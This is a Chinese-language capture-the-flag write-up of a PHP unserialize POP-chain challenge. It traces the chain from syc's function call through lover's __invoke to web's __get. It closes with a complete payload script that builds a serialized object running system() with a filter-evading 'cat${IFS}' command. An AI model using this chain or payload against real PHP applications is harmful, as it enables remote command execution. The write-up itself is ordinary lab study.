## 极客大挑战-unsign-反序列化

<br><br>

**拿到题目整体观察一下，可以发现这是pop链相关的反序列化**

<br>


<img src="https://54huarui.github.io/blogs/unisjpg/un1.png" width="880" height="480">

<br>

**反推法：从终点类反推pop**

<br>

**可以很明显地看到web类就是我们的终点，终点是web类的魔术方法__get**

<br>

**贴一个魔术方法的笔记**

<br>

<img src="https://54huarui.github.io/blogs/unisjpg/un2.png" width="880" height="480">

<br>

*想要触发get，就必须使得调用的成员方法不存在。观察整体，可以看到在lover类代码"return $this->yxx->QW“在调用成员*

<br>

<img src="https://54huarui.github.io/blogs/unisjpg/un3.png" width="880" height="480">

<br>

*乍一看好像没有什么毛病，其实我们如果使得这里的yxx变成web,那么$this->yxx->QW就会改写成$this->web->QW，而web类里并不存在QW这个成员，就可以触发魔术方法_get()*

<br>

*那么想要触发return $this->yxx->QW，就必须触发lover类的_invoke()这个魔术方法，而这个_invoke()魔术方法的触发方法是把对象当成函数调用。所以我们再次观察整体寻找突破口*

<br>

**可以发现在syc类中有一串$function=$this->cuit; return $function();这里是将cuit赋值给了function,然后调用函数function()。那么我们就让cuit赋值为web对象，这样就会将web当成函数调用从而触发魔术方法**

<br>

<img src="https://54huarui.github.io/blogs/unisjpg/un4.png" width="880" height="480">

<br>


**我们先做出一个半成品playload**

<br>

<img src="https://54huarui.github.io/blogs/unisjpg/un5.png" width="880" height="480">

<br>

**至此，所有pop链都已经解决，接下来看看终点是什么东西**

<br>

<img src="https://54huarui.github.io/blogs/unisjpg/un6.png" width="880" height="480">

<br>

**在终点处，我们可以给$eva1和$interesting传参。其中$eva1为函数,$interesting为参数**


<br>

**经过学长的帮助和多次尝试，终于确定了这里最终的命令public $eva1="system"; public $interesting="cat\${IFS}/$9flag";**

<br>

**全部playload如下**

<br>

<?php

class syc
{
    public $cuit;

}

class lover
{
    public $yxx;
    public $QW;


}

class web
{
    public $eva1="system";
    public $interesting="cat\${IFS}/$9flag";


}

$a=new syc;
$b=new lover;
$c=new web;


$a->cuit=$b;
$b->yxx=$c;

echo urlencode(serialize($a));


?>

<br>